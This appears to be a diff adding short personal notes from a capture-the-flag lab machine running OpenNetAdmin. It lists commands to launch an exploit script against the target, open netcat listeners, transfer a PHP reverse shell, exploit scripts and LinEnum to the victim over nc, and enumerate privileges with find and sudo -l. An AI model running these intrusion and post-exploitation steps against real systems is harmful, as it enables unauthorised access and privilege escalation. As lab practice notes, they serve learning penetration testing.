@@ -1,0 +1,25 @@
+Start the non-continues shell:
+./non-continues_shell_exploit.sh http://10.10.10.171/ona/
+
+Start listening to a port:
+nc -nvlp 1234
+
+server command for transfering files from the client:
+nc -nvlp 1234 > exploit2.php
+nc -nvlp 1234 > 47157.sh
+nc -nvlp 1234 > enumeration_script.sh
+
+
+
+sending files form client to server:
+nc 10.10.10.171 1234 < php-reverse-shell.php
+nc 10.10.10.171 1234 < 47167.sh
+nc 10.10.10.171 1234 < LinEnum.sh
+
+
+
+Look for stuff:
+find / -type d -user www-data
+
+How to know what commands I can run?
+sudo -l
